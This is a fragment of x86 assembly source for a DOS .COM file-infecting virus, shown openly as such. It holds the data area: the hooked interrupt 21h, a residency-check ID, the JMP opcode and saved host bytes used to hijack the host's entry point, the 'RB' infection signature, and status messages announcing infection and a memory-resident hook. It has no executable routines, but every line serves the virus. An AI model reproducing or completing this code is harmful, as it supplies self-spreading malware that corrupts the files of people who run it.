;----------------------------------------------------------------------------
; Data Area
;----------------------------------------------------------------------------
nISRNumber EQU 21h
nVirusID EQU 4B12h ;has to be 4Bxxh where the range are xx=03 to FF
_DX_DS dw 2 dup (?) ;DS:DX is stored here, first DX, then DS
;------------------------- DON'T SEPERATE -------------------------
HostBytesNew db 0E9h ;opcode for a JMP instruction
wHostFileLength dw ? ;length of the host file (minus 3)
VirusSignature db "RB" ;signature of the virus
;------------------------- DON'T SEPERATE -------------------------
HostBytesOld db 0CDh, 20h, ?
;first three bytes of host file. The first two bytes are set to
;INT 20h,so that when "this" file is executed without a host,
;it quits when it tries to transfer control to the host.
HostSignature db 2 dup (?) ;the virus signature is stored in bytes
;4 and 5 of the host file. If the file is infected, these bytes
;will be equal to "VirusSignature" defined below
;---------------------------------------------------------------------
sFileOpen db "Opening File for Read/Write...",0
sFileCheck db "Reading Signature from File...",0
sFileSignature db "Checking Signature...",0
sPointerMoved db "File Pointer Move OK...", 0
sComFile db "File is a .COM File......Infecting File with Virus!!",0
sFileInfected db "File has been infected...",0
sClosingFile db "Closing File...",0
sJumpUpdated db "Jump Instruction Added...", 0
sAlreadyInfected db "File is already infected...",0
hookdone db "The ISR is hook the virus are TSR",0
newisr db "Install New ISR..",0
db "File Handle:"
wHostFileHandle dw ? ;handle of the host file
